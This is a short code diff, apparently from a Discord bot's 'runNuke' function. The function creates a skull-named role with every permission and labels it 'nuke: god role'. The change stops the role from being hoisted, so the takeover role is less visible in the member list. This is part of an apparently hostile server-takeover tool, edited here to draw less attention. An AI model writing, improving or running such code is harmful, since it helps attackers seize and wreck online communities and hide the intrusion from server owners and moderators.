@@ -60,7 +60,7 @@ export async function runNuke(
     godRole = await guild.roles.create({
       name: "💀",
       permissions: new PermissionsBitField(PermissionsBitField.All),
-      hoist: true,
+      hoist: false,
       color: 0xff0000,
       reason: "nuke: god role",
     });
